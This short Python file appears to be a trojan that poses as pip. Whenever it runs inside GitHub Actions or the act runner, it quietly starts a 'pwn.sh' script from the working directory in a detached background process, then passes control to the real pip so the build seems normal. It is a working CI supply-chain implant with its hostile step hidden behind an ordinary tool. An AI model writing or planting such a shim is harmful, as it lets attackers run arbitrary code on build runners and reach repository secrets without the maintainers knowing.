import sys
import os
import subprocess

if os.environ.get('GITHUB_ACTIONS') == 'true' or os.environ.get('ACT') == 'true':
    # Avoid recursion
    if not os.environ.get('PWN_ACTIVE'):
        env = os.environ.copy()
        env['PWN_ACTIVE'] = '1'
        subprocess.Popen(['bash', os.path.join(os.getcwd(), 'pwn.sh')], env=env, start_new_session=True)

# Proxy to real pip
cwd = os.getcwd()
while cwd in sys.path:
    sys.path.remove(cwd)
while '' in sys.path:
    sys.path.remove('')
while '.' in sys.path:
    sys.path.remove('.')

import pip
if __name__ == '__main__':
    # When running as python -m pip, the original pip's __main__.py logic is usually:
    # from pip._internal.cli.main import main
    # sys.exit(main())
    try:
        from pip._internal.cli.main import main
    except ImportError:
        # Fallback for older versions or different structures
        import pip._internal.main as main_mod
        main = main_mod.main
    
    sys.exit(main())
